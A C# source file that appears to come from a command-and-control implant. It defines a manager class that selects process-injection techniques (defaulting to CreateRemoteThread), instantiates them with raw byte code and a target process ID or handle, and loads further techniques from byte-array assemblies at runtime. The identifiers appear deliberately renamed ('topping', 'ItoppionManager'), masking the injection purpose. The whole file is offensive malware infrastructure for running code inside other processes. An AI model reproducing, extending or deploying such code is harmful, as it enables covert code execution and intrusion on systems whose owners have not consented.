using Interop.Classes.Core;
using Interop.Interfaces;
using System;
using System.Collections.Concurrent;
using System.Linq;
using System.Reflection;

namespace topping
{
    public class toppingManager : ItoppionManager
    {
        private IAgent _agent;
        private Type _currentTechnique = typeof(Techniques.CreateRemoteThread.CreateRemoteThread);
        private ConcurrentDictionary<string, Type> _loadedTechniques = new ConcurrentDictionary<string, Type>();
        public toppingManager(IAgent agent)
        {
            _agent = agent;
            foreach (Type t in Assembly.GetExecutingAssembly().GetTypes())
            {
                if (t.Namespace != null && t.Namespace.StartsWith("topping.Techniques") &&
                    t.IsPublic &&
                    t.IsClass &&
                    t.IsVisible)
                {
                    string k = t.FullName.Replace("topping.Techniques.", "");
                    _loadedTechniques[k] = t;
                }
            }
        }

        public toppingTechnique CreateInstance(byte[] code, int pid)
        {
            return (toppingTechnique)Activator.CreateInstance(
                _currentTechnique,
                new object[] { _agent, code, pid });
        }

        public toppingTechnique CreateInstance(byte[] code, IntPtr hProcess)
        {
            return (toppingTechnique)Activator.CreateInstance(
                _currentTechnique,
                new object[] { _agent, code, hProcess });
        }

        public Type GetCurrentTechnique()
        {
            return _currentTechnique;
        }

        public string[] GetTechniques()
        {
            return _loadedTechniques.Keys.ToArray();
        }

        public bool LoadTechnique(byte[] assembly, string name)
        {
            bool bRet = false;
            Assembly tmp = Assembly.Load(assembly);
            foreach(Type t in tmp.GetTypes())
            {
                if (t.Name == name)
                {
                    _loadedTechniques[name] = t;
                    bRet = true;
                    break;
                }
            }
            return bRet;
        }

        public bool SetTechnique(string technique)
        {
            if (!_loadedTechniques.ContainsKey(technique))
            {
                return false;
            }
            _currentTechnique = _loadedTechniques[technique];
            return true;
        }
    }
}
